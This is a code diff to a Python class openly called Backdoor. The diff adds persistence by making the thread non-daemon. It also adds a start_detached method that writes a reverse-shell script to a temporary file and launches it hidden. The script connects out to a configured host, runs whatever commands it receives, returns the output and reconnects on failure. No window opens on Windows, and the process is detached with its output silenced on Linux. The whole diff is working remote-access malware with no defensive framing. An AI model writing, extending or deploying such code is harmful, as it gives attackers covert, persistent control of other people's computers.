@@ -89,7 +89,74 @@ class Backdoor:
                 pass
     
     def start_background(self):
-        """Start backdoor in background thread"""
-        thread = threading.Thread(target=self.run, daemon=True)
+        """Start backdoor in background thread - non-daemon so it persists"""
+        thread = threading.Thread(target=self.run, daemon=False)
         thread.start()
         return thread
+    
+    def start_detached(self):
+        """Start backdoor as a completely separate process"""
+        import subprocess
+        import sys
+        import os
+        
+        # Get the path to the backdoor script
+        if getattr(sys, 'frozen', False):
+            # Running as compiled exe
+            exe_dir = os.path.dirname(sys.executable)
+            python_exe = sys.executable
+        else:
+            # Running as script
+            python_exe = sys.executable
+        
+        # Start backdoor in a separate detached process
+        script_content = f'''
+import socket
+import subprocess
+import time
+
+def run_backdoor():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("{self.host}", {self.port}))
+            
+            while True:
+                cmd = sock.recv(1024).decode().strip()
+                if not cmd or cmd.lower() == 'exit':
+                    break
+                
+                try:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
+                    sock.send(output)
+                except Exception as e:
+                    sock.send(f"Error: {{str(e)}}\\n".encode())
+            
+            sock.close()
+        except:
+            time.sleep(5)  # Wait before reconnecting
+
+if __name__ == "__main__":
+    run_backdoor()
+'''
+        
+        # Write temporary backdoor script
+        import tempfile
+        fd, temp_path = tempfile.mkstemp(suffix='.py')
+        with os.fdopen(fd, 'w') as f:
+            f.write(script_content)
+        
+        # Start detached process
+        if os.name == 'nt':  # Windows
+            subprocess.Popen(
+                [python_exe, temp_path],
+                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+                close_fds=True
+            )
+        else:  # Linux
+            subprocess.Popen(
+                [python_exe, temp_path],
+                start_new_session=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
